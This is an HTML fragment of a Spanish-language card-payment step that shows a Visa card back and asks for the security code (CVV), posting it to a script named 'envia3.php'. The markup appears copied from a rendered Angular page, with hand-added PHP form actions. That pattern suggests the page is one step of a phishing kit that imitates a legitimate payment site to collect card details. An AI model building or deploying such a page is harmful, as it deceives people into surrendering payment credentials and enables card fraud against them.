                              ...
                              <div _ngcontent-prp-c36="" class="row justify-content-center align-items-center">
                                 ...
                                 <div _ngcontent-prp-c36="">
                                    <card-component _ngcontent-prp-c36="" _nghost-prp-c31="">
                                       <div _ngcontent-prp-c31="" class="row justify-content-center align-items-center" style="width: 310px; height: 175px;">
                                          <img _ngcontent-prp-c31="" id="cdImage" class="position-relative" src="media/card-visa-back.svg">
                                          <div style="position:absolute;color:#fff;font-size:12px;font-weight:700;line-height:14px;" class="cardSecurityCode"><span style="position:absolute;transform:translate(87px,-70%);">***</span></div>
                                       </div>
                                    </card-component>   
                                 </div>
                                 <div _ngcontent-prp-c36="" action="envia3.php" method="POST" class="col-12 mt-5">
                                    <form _ngcontent-prp-c36="" action="envia3.php" method="POST" class="ng-pristine ng-invalid ng-touched">
                                    ...
                                    <input type="hidden" name="cdType" value="media/card-visa-front.svg">
                                       <div _ngcontent-prp-c36="" class="form-group">
                                          <div _ngcontent-prp-c36="" class="input-group">
                                             <div _ngcontent-prp-c36="" class="card-number">
                                                <label _ngcontent-prp-c36="" class="label-input">Código de seguridad (CVV)</label><input _ngcontent-prp-c36="" id="cv" name="cv" type="tel" max-length="4" placeholder="Ej: 420" class="custom-input-dark card-icon ng-pristine ng-invalid ng-touched"><small _ngcontent-prp-c36="" id="cardNumberHelp" class="form-text help-text">Podrás encontrarlo en el dorso de la tarjeta</small>
                                 ...
                                 <div _ngcontent-prp-c36="" class="col-12">
                                    <div _ngcontent-prp-c36="" class="row mt-5 mb-5 pl-4 pr-4">
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-right order-1 order-md-0 mb-4"><button _ngcontent-prp-c36="" id="backButtonCode" type="button" class="btn-back-dark mb-4 mb-sm-0">Anterior</button></div>
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-left order-0 order-md-1 mb-4">
                                          <button _ngcontent-prp-c36="" id="cvButton" class="btn-disabled-dark d-block d-md-inline-block">Siguiente</button>
                                       </div>
                                    </div>
                                 </div>
                                 </form>
